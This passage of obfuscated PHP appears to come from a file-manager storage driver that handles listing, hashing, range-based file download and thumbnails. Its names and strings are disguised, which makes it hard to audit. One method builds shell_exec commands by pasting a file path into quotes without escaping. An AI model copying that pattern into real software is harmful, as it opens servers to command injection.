IO::remove($Ú¨‡…Œ¾); } return $À»æ†İ ? $±³¢ÖÈ : !1; } public function tempFile($‰Šî—‹¬ = '', $ıåŠÆ•Ã = '') { if (!$‰Šî—‹¬) { $‰Šî—‹¬ = rand_string(15); } $È”ÃŸåß = TEMP_FILES . rand_string(15) . $_SERVER[Ôó‡è­ƒ][8]; @mkdir($È”ÃŸåß, DEFAULT_PERRMISSIONS, !0); $Ç Ä‹ç = $È”ÃŸåß . $‰Šî—‹¬; @touch($Ç Ä‹ç); if ($ıåŠÆ•Ã) { file_put_contents($Ç Ä‹ç, $ıåŠÆ•Ã); } return $Ç Ä‹ç; } public function tempFileRemve($Ğ¢ÜŞÚĞ) { @unlink($Ğ¢ÜŞÚĞ); @rmdir($this->pathFather($Ğ¢ÜŞÚĞ)); } public function mkfile($çÂŠšú¿, $ÂïÇöêƒ = '', $ë¥’áÆâ = REPEAT_RENAME) { } public function mkdir($îİ÷ïÕ, $”·½—ÑÅ = REPEAT_SKIP) { } public function delFile($âÆóà) { } public function delFolder($¨Ë¦Äëß) { } public function copyFile($‘¦å•’Ş, $¨ ®İ¼) { } public function moveFile($‹èâÉöù, $êŸúÊŠª) { } public function remove($÷Õ“›´ğ) { if ($this->isFile($÷Õ“›´ğ)) { return $this->delFile($÷Õ“›´ğ); } return $this->delFolder($÷Õ“›´ğ); } public function rename($©†•„„‡, $×ÔÄÀ•ˆ) { } public function exist($»çî¦–“) { } public function findByHash($ìÓ“Èù = '', $ÎÙ¡ÑÑ = '') { return !1; } public function isFile($•¤¤âÁ—) { } public function isFolder($Ââåíí›) { } public function size($·ƒ¶•‘º) { } public function info($îˆ®Ë–) { } public function infoSimple($Áèæ´‹ü) { return $this->info($Áèæ´‹ü); } public function infoAuth($ÕºúŠ¥ñ) { return $this->info($ÕºúŠ¥ñ); } public function infoFull($üøòÆÉƒ) { return $this->info($üøòÆÉƒ); } public function infoWithChildren($Àè¶Ğ»è) { $¢µúÔ…é =& $_SERVER[Ôó‡è­ƒ]; static $¡Ú–¤¨À = array(); if (isset($¡Ú–¤¨À[$Àè¶Ğ»è])) { return $¡Ú–¤¨À[$Àè¶Ğ»è]; } $™²“‘ş÷ = $this->info($Àè¶Ğ»è); if ($™²“‘ş÷ && $™²“‘ş÷[$¢µúÔ…é[33]] == $¢µúÔ…é[79]) { $ó–¬¾³ = array($¢µúÔ…é[80] => 0, $¢µúÔ…é[81] => 0, $¢µúÔ…é[82] => 0); $this->infoChildren($Àè¶Ğ»è, $ó–¬¾³); $™²“‘ş÷[$¢µúÔ…é[80]] = $ó–¬¾³[$¢µúÔ…é[80]]; $™²“‘ş÷[$¢µúÔ…é[83]] = array($¢µúÔ…é[84] => $ó–¬¾³[$¢µúÔ…é[81]], $¢µúÔ…é[85] => $ó–¬¾³[$¢µúÔ…é[82]]); $¡Ú–¤¨À[$Àè¶Ğ»è] = $™²“‘ş÷; } return $™²“‘ş÷; } public function listPath($½êÒËÉå, $¢ŒÏ»’€ = false) { } public function has($Ê”œµñ, $ëÍƒ¡ÜÕ = false, $«î©Œ‚¯ = false) { } public function canRead($Ğ”†²–é) { } public function canWrite($¦èËè®) { } public function getContent($Ú­œ’û) { } public function setContent($ûÉÌìÕ•, $¿«ë•®Ù = '') { } protected function infoChildren($¸çúê®, &$äÃ––Š) { $å¼ä´Öˆ =& $_SERVER[Ôó‡è­ƒ]; check_abort_echo(); $¯İáé»Ã = $this->listPath($¸çúê®, !0); $¯İáé»Ã = array_merge($¯İáé»Ã[$å¼ä´Öˆ[77]], $¯İáé»Ã[$å¼ä´Öˆ[76]]); foreach ($¯İáé»Ã as $ê€ßê‰) { if ($ê€ßê‰[$å¼ä´Öˆ[33]] == $å¼ä´Öˆ[79]) { $äÃ––Š[$å¼ä´Öˆ[82]]++; $ï ˆÄÕ× = $this->getPathInner($ê€ßê‰[$å¼ä´Öˆ[78]]); $this->infoChildren($ï ˆÄÕ×, $äÃ––Š); } else { $äÃ––Š[$å¼ä´Öˆ[81]]++; $äÃ––Š[$å¼ä´Öˆ[80]] += $ê€ßê‰[$å¼ä´Öˆ[80]]; } } } public function fileSubstr($æÔéú—÷, $ÃßŸèÙ, $ã½¡Óóâ) { } public function listAll($š¶†±ú) { } public function listAllMake($ü·öÌ, &$«Ïê¯Óú) { $«³îÉ¤¹ =& $_SERVER[Ôó‡è­ƒ]; check_abort_echo(); $…Û˜¾Èº = $this->listPath($ü·öÌ, !0); if (!$…Û˜¾Èº) { return; } $Âäø¬¶¥ = array_merge($…Û˜¾Èº[$«³îÉ¤¹[77]], $…Û˜¾Èº[$«³îÉ¤¹[76]]); foreach ($Âäø¬¶¥ as $–€î¼Ñ ) { $ëùÛÉğÒ = $–€î¼Ñ [$«³îÉ¤¹[33]] == $«³îÉ¤¹[79]; $Ğáë¥Äü = array($«³îÉ¤¹[78] => $–€î¼Ñ [$«³îÉ¤¹[78]], $«³îÉ¤¹[79] => $ëùÛÉğÒ); if (isset($–€î¼Ñ [$«³îÉ¤¹[80]])) { $Ğáë¥Äü[$«³îÉ¤¹[80]] = $–€î¼Ñ [$«³îÉ¤¹[80]]; } if (isset($–€î¼Ñ [$«³îÉ¤¹[86]])) { $Ğáë¥Äü[$«³îÉ¤¹[86]] = $–€î¼Ñ [$«³îÉ¤¹[86]]; } if (!$ëùÛÉğÒ) { $«Ïê¯Óú[] = $Ğáë¥Äü; continue; } $«Ïê¯Óú[] = $Ğáë¥Äü; $İÈşÃö = $–€î¼Ñ [$«³îÉ¤¹[78]]; $ÑØæŠÕó = $this->pathDriver; if (substr($–€î¼Ñ [$«³îÉ¤¹[78]], 0, strlen($ÑØæŠÕó)) == $ÑØæŠÕó) { $İÈşÃö = substr($İÈşÃö, strlen($ÑØæŠÕó)); } $this->listAllMake($İÈşÃö, $«Ïê¯Óú); } } public function listAllSimple($ÁÕ“œÊÙ) { $«ã¡ê‚ =& $_SERVER[Ôó‡è­ƒ]; $óõğ¿¢Ş = array(); $›Ã¥â²® = $this->listAll($ÁÕ“œÊÙ); $»¬£Óè´ = $this->getPathOuter($ÁÕ“œÊÙ); foreach ($›Ã¥â²® as $šõäíûå) { $Œ»Ôññ¦ = $šõäíûå[$«ã¡ê‚[78]]; $¬‡Ñ¢² = $šõäíûå[$«ã¡ê‚[78]]; if (isset($šõäíûå[$«ã¡ê‚[87]])) { $Œ»Ôññ¦ = $šõäíûå[$«ã¡ê‚[87]][$«ã¡ê‚[78]]; $šõäíûå[$«ã¡ê‚[80]] = $šõäíûå[$«ã¡ê‚[87]][$«ã¡ê‚[80]]; $šõäíûå[$«ã¡ê‚[86]] = $šõäíûå[$«ã¡ê‚[87]][$«ã¡ê‚[86]]; } else { $¬‡Ñ¢² = substr($šõäíûå[$«ã¡ê‚[78]], strlen(get_path_father($»¬£Óè´))); $¬‡Ñ¢² = $«ã¡ê‚[8] . ltrim($¬‡Ñ¢², $«ã¡ê‚[8]); } $åÕˆØãœ = array($«ã¡ê‚[78] => $¬‡Ñ¢², $«ã¡ê‚[79] => $šõäíûå[$«ã¡ê‚[79]]); if (isset($šõäíûå[$«ã¡ê‚[80]]) && !$šõäíûå[$«ã¡ê‚[79]]) { $åÕˆØãœ[$«ã¡ê‚[80]] = $šõäíûå[$«ã¡ê‚[80]]; } if (isset($šõäíûå[$«ã¡ê‚[86]])) { $åÕˆØãœ[$«ã¡ê‚[86]] = $šõäíûå[$«ã¡ê‚[86]]; } if (!$šõäíûå[$«ã¡ê‚[79]]) { $åÕˆØãœ[$«ã¡ê‚[88]] = $Œ»Ôññ¦; } $óõğ¿¢Ş[] = $åÕˆØãœ; } return $óõğ¿¢Ş; } public function upload($·³œÄ¨ô, $Í¢×­¸°, $„íŠì³Õ = false, $¶ªßÍŸØ = REPEAT_REPLACE) { } public function uploadFileByID($ı•éŒ¹‹, $—ºü¦Ğó, $ˆÙÊê¹µ) { } public function uploadFileByPath($İÅÆ×·‡, $ÈœÅØşï, $ÄíùÁû¹ = array()) { } public function isUploadServer() { $º×ÁÛû =& $_SERVER[Ôó‡è­ƒ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $º×ÁÛû[89]) { return !0; } return $GLOBALS[$º×ÁÛû[6]][$º×ÁÛû[90]][$º×ÁÛû[91]]; } public function isFileOutServer() { $±ıî±´¢ =& $_SERVER[Ôó‡è­ƒ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $±ıî±´¢[89]) { return !0; } return $GLOBALS[$±ıî±´¢[6]][$±ıî±´¢[90]][$±ıî±´¢[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($‰Õ­ØñÎ) { $¡¨ºÀÊ± =& $_SERVER[Ôó‡è­ƒ]; if (!$this->isCdnHost()) { return $‰Õ­ØñÎ; } return str_replace(trim(get_url_root($‰Õ­ØñÎ), $¡¨ºÀÊ±[8]), trim($this->cdnHost, $¡¨ºÀÊ±[8]), $‰Õ­ØñÎ); } public function uploadLink($ğ„¬ŠÖ, $ª­…‹æ = 0) { $‘Ê–¨É¸ =& $_SERVER[Ôó‡è­ƒ]; if ($this->isUploadServer()) { return; } $€”ØæÂÃ = $this->getType(); if (!in_array($€”ØæÂÃ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‹æ‘òğÆ = 1024 * 1024 * 10; $¸æ‘†½ = $ª­…‹æ <= $‹æ‘òğÆ ? $‘Ê–¨É¸[93] : $‘Ê–¨É¸[94]; $œŞ¼®Ôô = (!$ª­…‹æ ? 1 : ceil($ª­…‹æ / pow(1024, 3))) * 3600 * 4; $üùËìÆ¯ = $this->{$¸æ‘†½}($ğ„¬ŠÖ, $œŞ¼®Ôô); if ($üùËìÆ¯) { $üùËìÆ¯[$‘Ê–¨É¸[95]] = $ğ„¬ŠÖ; $üùËìÆ¯[$‘Ê–¨É¸[96]] = $€”ØæÂÃ; } return $üùËìÆ¯; } public function uploadFormData($¼±§µ‘Ò, $˜¡ñÚ°Î = 3600) { } public function multiUploadFormData($ç÷Ó÷Òú, $üàŒƒŞÛ = 3600) { } public function download($ÆÛŸ˜¬æ, $²ƒ£²êİ) { } public function ext($›‹âƒ­ï) { $Ò¿Ğ¤ä¾ =& $_SERVER[Ôó‡è­ƒ]; if (strpos($›‹âƒ­ï, $Ò¿Ğ¤ä¾[8]) === -1) { $áŠ¤²œ = $›‹âƒ­ï; } else { $áŠ¤²œ = $this->pathThis($›‹âƒ­ï); } $âäûëÚÀ = $Ò¿Ğ¤ä¾[12]; if (strstr($áŠ¤²œ, $Ò¿Ğ¤ä¾[10])) { $âäûëÚÀ = substr($áŠ¤²œ, strrpos($áŠ¤²œ, $Ò¿Ğ¤ä¾[10]) + 1); $âäûëÚÀ = strtolower($âäûëÚÀ); } if (strlen($âäûëÚÀ) > 3 && preg_match($Ò¿Ğ¤ä¾[97], $âäûëÚÀ, $Ğ¶™‚‘Ö)) { $âäûëÚÀ = $Ò¿Ğ¤ä¾[12]; } return $âäûëÚÀ; } public function pathThis($ßÓëâÔô) { $ÍÉãü„’ =& $_SERVER[Ôó‡è­ƒ]; $ßÓëâÔô = str_replace($ÍÉãü„’[98], $ÍÉãü„’[8], rtrim($ßÓëâÔô, $ÍÉãü„’[8])); $‹ñ´ØÅˆ = strrpos($ßÓëâÔô, $ÍÉãü„’[8]); if ($‹ñ´ØÅˆ === !1) { return $ßÓëâÔô; } return substr($ßÓëâÔô, $‹ñ´ØÅˆ + 1); } public function pathFather($ÇÍÈê€) { $ÕË‰½ıË =& $_SERVER[Ôó‡è­ƒ]; $ÇÍÈê€ = str_replace($ÕË‰½ıË[98], $ÕË‰½ıË[8], rtrim($ÇÍÈê€, $ÕË‰½ıË[8])); $óôÙ‹Ë = strrpos($ÇÍÈê€, $ÕË‰½ıË[8]); if ($óôÙ‹Ë === !1) { return $ÕË‰½ıË[12]; } return substr($ÇÍÈê€, 0, $óôÙ‹Ë + 1); } public function hashSimple($ œ™Âé) { $–¢ğÃ¦å =& $_SERVER[Ôó‡è­ƒ]; if (!$ œ™Âé) { return md5($–¢ğÃ¦å[12]); } $¢“¾„ ü = $this->size($ œ™Âé); $Í½·¤ªÙ = 200; $¢‡Â¦Äƒ = 50; if ($¢“¾„ ü <= $Í½·¤ªÙ * $¢‡Â¦Äƒ) { return $this->hashMd5($ œ™Âé) . $¢“¾„ ü; } $‚³£¶…¬ = intval($¢“¾„ ü / $¢‡Â¦Äƒ); $½õÀ§ßê = $–¢ğÃ¦å[12]; for ($ÉÂºâà€ = 0; $ÉÂºâà€ < $¢‡Â¦Äƒ; $ÉÂºâà€++) { $½õÀ§ßê .= $this->fileSubstr($ œ™Âé, $‚³£¶…¬ * $ÉÂºâà€, $Í½·¤ªÙ); } $½õÀ§ßê .= $this->fileSubstr($ œ™Âé, $¢“¾„ ü - $Í½·¤ªÙ, $Í½·¤ªÙ); return md5($½õÀ§ßê) . $¢“¾„ ü; } public static $md5Cache = array(); public function hashMd5($˜Å‰ÖÀÔ) { if (!$˜Å‰ÖÀÔ) { return md5($_SERVER[Ôó‡è­ƒ][12]); } $˜Å‰ÖÀÔ = $this->iconvSystem($˜Å‰ÖÀÔ); if (isset(self::$md5Cache[$˜Å‰ÖÀÔ])) { return self::$md5Cache[$˜Å‰ÖÀÔ]; } self::$md5Cache[$˜Å‰ÖÀÔ] = $this->hashMd5Shell($˜Å‰ÖÀÔ); if (!self::$md5Cache[$˜Å‰ÖÀÔ]) { self::$md5Cache[$˜Å‰ÖÀÔ] = @md5_file($˜Å‰ÖÀÔ); } return self::$md5Cache[$˜Å‰ÖÀÔ]; } private function hashMd5Shell($Á™´³¥) { $½ğ±Ş“ =& $_SERVER[Ôó‡è­ƒ]; if (!$Á™´³¥) { return md5($½ğ±Ş“[12]); } if (!function_exists($½ğ±Ş“[99])) { return !1; } $âíåŠ»¹ = array($½ğ±Ş“[100], $½ğ±Ş“[101]); $¼ºµ²ºñ = Cache::get($½ğ±Ş“[102]); if (!$¼ºµ²ºñ) { $œÒç¼½ = BASIC_PATH . $½ğ±Ş“[103]; $áâˆ‹¿Œ = md5_file($œÒç¼½); $¼ºµ²ºñ = $½ğ±Ş“[104]; foreach ($âíåŠ»¹ as $şŸ«Ö–—) { $˜˜Â¯œÖ = shell_exec($şŸ«Ö–— . "\40\x22{$œÒç¼½}\42"); if ($˜˜Â¯œÖ && substr(trim($˜˜Â¯œÖ), 0, 32) == $áâˆ‹¿Œ) { $¼ºµ²ºñ = $şŸ«Ö–—; break; } } Cache::set($½ğ±Ş“[102], $¼ºµ²ºñ, 3600); } if ($¼ºµ²ºñ == $½ğ±Ş“[104]) { return !1; } $˜˜Â¯œÖ = shell_exec($¼ºµ²ºñ . "\x20\42{$Á™´³¥}\42"); $˜˜Â¯œÖ = str_replace($½ğ±Ş“[105], $½ğ±Ş“[12], $˜˜Â¯œÖ); return substr($˜˜Â¯œÖ, 0, 32); } public function link($ûùÙ¯Ï) { return $ûùÙ¯Ï; } public function fileOut($¨œñ’ôÖ, $ã×ª²­Å = false, $±ƒÛ®–ê = false, $·óäæø¡ = '') { $ú›·ÎÂ  =& $_SERVER[Ôó‡è­ƒ]; $this->cacheMethod(null, null); if (!$¨œñ’ôÖ || !$this->exist($¨œñ’ôÖ)) { show_json(LNG($ú›·ÎÂ [106]), !1, $±ƒÛ®–ê); } $Ğ Â¡„– = $this->getType() == $ú›·ÎÂ [107]; $ ¥›Ÿå‰ = $GLOBALS[$ú›·ÎÂ [6]][$ú›·ÎÂ [90]][$ú›·ÎÂ [108]][$ú›·ÎÂ [109]]; $â€˜»¯ = (double) $GLOBALS[$ú›·ÎÂ [6]][$ú›·ÎÂ [90]][$ú›·ÎÂ [108]][$ú›·ÎÂ [110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ü¢¹µö‹ = $this->infoFull($¨œñ’ôÖ); $¤¼šøØİ = $Ü¢¹µö‹[$ú›·ÎÂ [80]]; $Ä£»÷„ˆ = gmdate($ú›·ÎÂ [111], $Ü¢¹µö‹[$ú›·ÎÂ [86]]); $ØÌ—‘“ = $±ƒÛ®–ê ? $±ƒÛ®–ê : $this->iconvApp($Ü¢¹µö‹[$ú›·ÎÂ [32]]); $°‰Áàãò = 0; $îéÚ¢è¹ = $¤¼šøØİ - 1; $ùç·ÔİŒ = $this->ext($ØÌ—‘“); if (in_array($ùç·ÔİŒ, array($ú›·ÎÂ [112], $ú›·ÎÂ [113], $ú›·ÎÂ [114], $ú›·ÎÂ [115]))) { $ùç·ÔİŒ = $ú›·ÎÂ [116]; } if (in_array($ùç·ÔİŒ, array($ú›·ÎÂ [117]))) { $ùç·ÔİŒ = $ú›·ÎÂ [118]; } if (!$·óäæø¡) { $·óäæø¡ = md5($Ä£»÷„ˆ . $this->hashSimple($¨œñ’ôÖ)); } $·óäæø¡ = $ú›·ÎÂ [119] . $·óäæø¡ . $ú›·ÎÂ [119]; $ªõÓâ®™ = get_file_mime($ùç·ÔİŒ); $Æ÷âÙİ÷ = !1; if (isset($_GET[$ú›·ÎÂ [120]])) { $Æ÷âÙİ÷ = !0; } if ($ã×ª²­Å === !1 && !mime_support($ªõÓâ®™)) { $ªõÓâ®™ = $ú›·ÎÂ [121]; } header($ú›·ÎÂ [122]); header($ú›·ÎÂ [123] . $ªõÓâ®™); $ÏĞŠ§íª = rawurlencode($ØÌ—‘“); $ÏĞŠ§íª = $ú›·ÎÂ [119] . $ÏĞŠ§íª . $ú›·ÎÂ [124] . $ÏĞŠ§íª; if ($ã×ª²­Å) { header($ú›·ÎÂ [125]); header($ú›·ÎÂ [126] . $ÏĞŠ§íª); } else { if ($Æ÷âÙİ÷) { header($ú›·ÎÂ [127] . $ÏĞŠ§íª); } } header($ú›·ÎÂ [128] . gmdate($ú›·ÎÂ [111], time() + 3600 * 24 * 30) . $ú›·ÎÂ [129]); header($ú›·ÎÂ [130]); header($ú›·ÎÂ [131]); header($ú›·ÎÂ [132]); if (isset($_SERVER[$ú›·ÎÂ [133]]) && strtotime($_SERVER[$ú›·ÎÂ [133]]) == $Ü¢¹µö‹[$ú›·ÎÂ [86]]) { header($ú›·ÎÂ [134], !0, 304); die; } if (isset($_SERVER[$ú›·ÎÂ [135]]) && $_SERVER[$ú›·ÎÂ [135]] == $·óäæø¡) { header($ú›·ÎÂ [136] . $·óäæø¡, !0, 304); die; } header($ú›·ÎÂ [136] . $·óäæø¡); header($ú›·ÎÂ [137] . $Ä£»÷„ˆ . $ú›·ÎÂ [129]); header($ú›·ÎÂ [138] . $ØÌ—‘“); header($ú›·ÎÂ [139]); header($ú›·ÎÂ [140] . $¤¼šøØİ); header($ú›·ÎÂ [141]); if (!$ã×ª²­Å && $ùç·ÔİŒ == $ú›·ÎÂ [142]) { if ($¤¼šøØİ > 1024 * 1024 * 5) { die; } $¸€Õ» = $this->getContent($¨œñ’ôÖ); $¸€Õ» = Html::clearSVG($¸€Õ»); header($ú›·ÎÂ [143] . strlen($¸€Õ»)); echo $¸€Õ»; die; } $´¹ó±ñÑ = strtolower($_SERVER[$ú›·ÎÂ [144]]); if ($Ğ Â¡„– && $´¹ó±ñÑ && $ ¥›Ÿå‰) { if (strstr($´¹ó±ñÑ, $ú›·ÎÂ [145])) { header($ú›·ÎÂ [146] . $¨œñ’ôÖ); } else { if (strstr($´¹ó±ñÑ, $ú›·ÎÂ [147])) { header($ú›·ÎÂ [148] . $¨œñ’ôÖ); } else { if (strstr($´¹ó±ñÑ, $ú›·ÎÂ [149])) { header($ú›·ÎÂ [150] . $¨œñ’ôÖ); } } } if ($â€˜»¯) { header($ú›·ÎÂ [151] . $â€˜»¯); } return; } if (isset($_SERVER[$ú›·ÎÂ [152]])) { if (preg_match($ú›·ÎÂ [153], $_SERVER[$ú›·ÎÂ [152]], $‰ÛÉ›¼)) { $°‰Áàãò = intval($‰ÛÉ›¼[1]); if (!empty($‰ÛÉ›¼[2])) { $îéÚ¢è¹ = intval($‰ÛÉ›¼[2]); } } header($ú›·ÎÂ [154]); header("\x43\x6f\156\x74\145\x6e\164\x2d\x52\141\156\147\145\x3a\40\142\171\164\x65\x73\40{$°‰Áàãò}\55{$îéÚ¢è¹}\57" . $¤¼šøØİ); } else { header($ú›·ÎÂ [155]); } header($ú›·ÎÂ [156]); $æ¤…«ãï = !0; if ($_SERVER[$ú›·ÎÂ [157]] == $ú›·ÎÂ [158] && $¤¼šøØİ > 1204 * 1024 * 1024 * 2) { $æ¤…«ãï = !1; } if ($æ¤…«ãï) { header($ú›·ÎÂ [159] . ($îéÚ¢è¹ - $°‰Áàãò + 1)); } if ($_SERVER[$ú›·ÎÂ [160]] == $ú›·ÎÂ [161]) { return; } $Æ×çË = 1024 * 100; $ÌÏ³Öí = 0; if ($â€˜»¯) { $ÌÏ³Öí = intval(1000 * 1000 * ($Æ×çË / $â€˜»¯)); } while ($°‰Áàãò <= $îéÚ¢è¹) { $Õ†¶¦” = timeFloat(); check_abort(); $æšÛË±ñ = $îéÚ¢è¹ - $°‰Áàãò + 1; if ($æšÛË±ñ <= $Æ×çË) { $Æ×çË = $æšÛË±ñ; } echo $this->fileSubstr($¨œñ’ôÖ, $°‰Áàãò, $Æ×çË); $°‰Áàãò += $Æ×çË; if ($Æ×çË == $æšÛË±ñ) { $°‰Áàãò = $îéÚ¢è¹ + 1; } if ($ÌÏ³Öí) { $ü×‘æŸ½ = intval(1000 * 1000 * (timeFloat() - $Õ†¶¦”)); $®òãûƒ = $ÌÏ³Öí - $ü×‘æŸ½; if ($®òãûƒ > 5) { usleep($®òãûƒ); } } } } public function fileOutServer($ôı÷ã°ª, $Æ‚àŠ©Â = false, $€Å×à° = false, $Ì¯Š‘ğå = '') { $this->fileOut($ôı÷ã°ª, $Æ‚àŠ©Â, $€Å×à°, $Ì¯Š‘ğå); } public function fileOutLink($Ğ¡—ïÛø) { header($_SERVER[Ôó‡è­ƒ][162] . $Ğ¡—ïÛø); die; } public function cacheMethod($ä—®Óº¾, $¬©êØ‘ó, $øØòô—Ï = null) { $„ìûÑ =& $_SERVER[Ôó‡è­ƒ]; static $—Ğ¼×— = array(); $Îİ÷šÅ• = $¬©êØ‘ó ? ltrim($this->getPathOuter($¬©êØ‘ó), $„ìûÑ[8]) : $¬©êØ‘ó; $ø÷¦Œš‚ = $„ìûÑ[163] . $ä—®Óº¾ . $„ìûÑ[164] . rtrim($Îİ÷šÅ•, $„ìûÑ[8]); if (is_null($ä—®Óº¾)) { $—Ğ¼×— = array(); return; } if (is_null($¬©êØ‘ó)) { unset($—Ğ¼×—[$ø÷¦Œš‚]); return; } if (!is_null($øØòô—Ï)) { $—Ğ¼×—[$ø÷¦Œš‚] = $øØòô—Ï; return; } $À ½¢’¥ = isset($—Ğ¼×—[$ø÷¦Œš‚]) ? $—Ğ¼×—[$ø÷¦Œš‚] : null; if (!is_null($À ½¢’¥)) { return $À ½¢’¥; } $À ½¢’¥ = $this->{$ä—®Óº¾}($¬©êØ‘ó); $—Ğ¼×—[$ø÷¦Œš‚] = $À ½¢’¥; return $À ½¢’¥; } public function fileOutImage($¼êàòí®, $¢íñƒİÅ = 250) { $¼ìº‚ÏÌ =& $_SERVER[Ôó‡è­ƒ]; set_timeout(); if (substr($¼êàòí®, 0, 4) == $¼ìº‚ÏÌ[149]) { $this->fileOutLink($¼êàòí®); } $ªÍ”˜Àù = $this->info($¼êàòí®); $Ã½‰€ŒÓ = $ªÍ”˜Àù[$¼ìº‚ÏÌ[32]]; $¬ƒìÔÆ = !1; if (isset($GLOBALS[$¼ìº‚ÏÌ[165]]) && $GLOBALS[$¼ìº‚ÏÌ[165]][$¼ìº‚ÏÌ[78]] == $ªÍ”˜Àù[$¼ìº‚ÏÌ[78]]) { $£ˆ¤´®‡ = $GLOBALS[$¼ìº‚ÏÌ[165]][$¼ìº‚ÏÌ[166]]; if (!$ªÍ”˜Àù[$¼ìº‚ÏÌ[167]]) { $ªÍ”˜Àù[$¼ìº‚ÏÌ[167]] = $GLOBALS[$¼ìº‚ÏÌ[165]]; } if (isset($£ˆ¤´®‡[$¼ìº‚ÏÌ[168]])) { if ($£ˆ¤´®‡[$¼ìº‚ÏÌ[168]] <= $¢íñƒİÅ && $£ˆ¤´®‡[$¼ìº‚ÏÌ[169]] <= $¢íñƒİÅ) { $¬ƒìÔÆ = !0; } } $Ã½‰€ŒÓ = $ªÍ”˜Àù[$¼ìº‚ÏÌ[167]][$¼ìº‚ÏÌ[32]]; } if ($ªÍ”˜Àù[$¼ìº‚ÏÌ[80]] <= 1024 * 50 || $¬ƒìÔÆ || !function_exists($¼ìº‚ÏÌ[170]) || $ªÍ”˜Àù[$¼ìº‚ÏÌ[171]] == $¼ìº‚ÏÌ[172]) { return $this->fileOut($¼êàòí®, !1, $Ã½‰€ŒÓ); } if (isset($ªÍ”˜Àù[$¼ìº‚ÏÌ[167]][$¼ìº‚ÏÌ[173]])) { $Ş¡Æ„Ïã = $ªÍ”˜Àù[$¼ìº‚ÏÌ[167]][$¼ìº‚ÏÌ[173]]; } else { if (isset($ªÍ”˜Àù[$¼ìº‚ÏÌ[167]][$¼ìº‚ÏÌ[174]])) { $Ş¡Æ„Ïã = $ªÍ”˜Àù[$¼ìº‚ÏÌ[167]][$¼ìº‚ÏÌ[174]]; } else { $Ş¡Æ„Ïã = md5("{$ªÍ”˜Àù[$¼ìº‚ÏÌ[32]]}\x5f{$ªÍ”˜Àù[$¼ìº‚ÏÌ[78]]}\137{$ªÍ”˜Àù[$¼ìº‚ÏÌ[80]]}"); } } $××©ª™ = "{$Ş¡Æ„Ïã}\x5f{$¢íñƒİÅ}\56\160\156\x67"; if (!($£·Ï”Áš = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¼ìº‚ÏÌ[175]))) { $šÉçÓ° = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¼ìº‚ÏÌ[176]); } else { $šÉçÓ° = KodIO::make($£·Ï”Áš); } if ($£·Ï”Áš = IO::fileNameExist($šÉçÓ°, $××©ª™)) { $¿ ïÈşˆ = KodIO::make($£·Ï”Áš); return IO::fileOut($¿ ïÈşˆ, !1, $Ã½‰€ŒÓ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¿ ïÈşˆ = DATA_THUMB . $××©ª™; del_file($¿ ïÈşˆ); if (!@file_exists($¿ ïÈşˆ)) { $Ô¹èá™” = TEMP_FILES; if (!is_dir($Ô¹èá™”)) { mk_dir($Ô¹èá™”); } $âğäû¥ = $Ô¹èá™” . $Ş¡Æ„Ïã . $¼ìº‚ÏÌ[10] . $ªÍ”˜Àù[$¼ìº‚ÏÌ[171]]; if (!@file_exists($âğäû¥)) { $âğäû¥ = $this->download($¼êàòí®, $âğäû¥); } ImageThumb::createThumb($âğäû¥, $¿ ïÈşˆ, $¢íñƒİÅ, $¢íñƒİÅ * 10); } if (!file_exists($¿ ïÈşˆ) || filesize($¿ ïÈşˆ) < 100) { return @file_exists($âğäû¥) ? IO::fileOut($âğäû¥) : $this->fileOut($¼êàòí®); } if (!($–¼¼±ÇÆ = IO::move($¿ ïÈşˆ, $šÉçÓ°))) { return IO::fileOut($¿ ïÈşˆ); } del_file($¿ ïÈşˆ); IO::fileOut($–¼¼±ÇÆ); } public function fileOutImageServer($àäø€®¬, $¢‹ÌÓ› = 250) { $this->fileOutImage($àäø€®¬, $¢‹ÌÓ›); } public function fileNameAuto($º°¤úÓå, $†ğ¾“¾”, $êıÖÆ¤© = REPEAT_RENAME, $ğ¡Ü¡ğ = false) { $öÂß›æÌ =& $_SERVER[Ôó‡è­ƒ]; $ÈÑÒ‘­Ç = $º°¤úÓå === $öÂß›æÌ[12] ? $†ğ¾“¾” : rtrim($º°¤úÓå, $öÂß›æÌ[8]) . $öÂß›æÌ[8] . $†ğ¾“¾”; if ($êıÖÆ¤© == REPEAT_REPLACE || !$this->exist($ÈÑÒ‘­Ç) || $ğ¡Ü¡ğ && $êıÖÆ¤© != REPEAT_RENAME_FOLDER) { return $†ğ¾“¾”; } if ($êıÖÆ¤© == REPEAT_SKIP) { return !1; } $ä£­–à‘ = $öÂß›æÌ[10] . get_path_ext($†ğ¾“¾”); $ä£­–à‘ = $ä£­–à‘ == $öÂß›æÌ[10] || $ğ¡Ü¡ğ ? $öÂß›æÌ[12] : $ä£­–à‘; $ÉÑæîï’ = 1; $§åü¡ç = substr($†ğ¾“¾”, 0, strlen($†ğ¾“¾”) - strlen($ä£­–à‘)); $ğú¿íæİ = $§åü¡ç . "\50{$ÉÑæîï’}\x29{$ä£­–à‘}"; while ($this->exist(rtrim($º°¤úÓå, $öÂß›æÌ[8]) . $öÂß›æÌ[8] . $ğú¿íæİ)) { $ğú¿íæİ = $§åü¡ç . "\50{$ÉÑæîï’}\x29{$ä£­–à‘}"; $ÉÑæîï’++; } return $ğú¿íæİ; } private function fileNameAutoList($å§ö³·, $­ô€åùö, $­›²İƒ¢ = false) { $á‚Œ¿Şà =& $_SERVER[Ôó‡è­ƒ]; $è‹İ¨ï³ = $this->listPath($å§ö³·, !0); $è‹İ¨ï³ = array_merge($è‹İ¨ï³[$á‚Œ¿Şà[77]], $è‹İ¨ï³[$á‚Œ¿Şà[76]]); $‹Öæºä´ = array_to_keyvalue($è‹İ¨ï³, $á‚Œ¿Şà[12], $á‚Œ¿Şà[32]); $ò¼×ÓÑğ = $á‚Œ¿Şà[10] . get_path_ext($­ô€åùö); $ò¼×ÓÑğ = $ò¼×ÓÑğ == $á‚Œ¿Şà[10] || $­›²İƒ¢ ? $á‚Œ¿Şà[12] : $ò¼×ÓÑğ; $¸öåä‡Ö = substr($­ô€åùö, 0, strlen($­ô€åùö) - strlen($ò¼×ÓÑğ)); $¦ÔÒ¬š» = $¸öåä‡Ö . 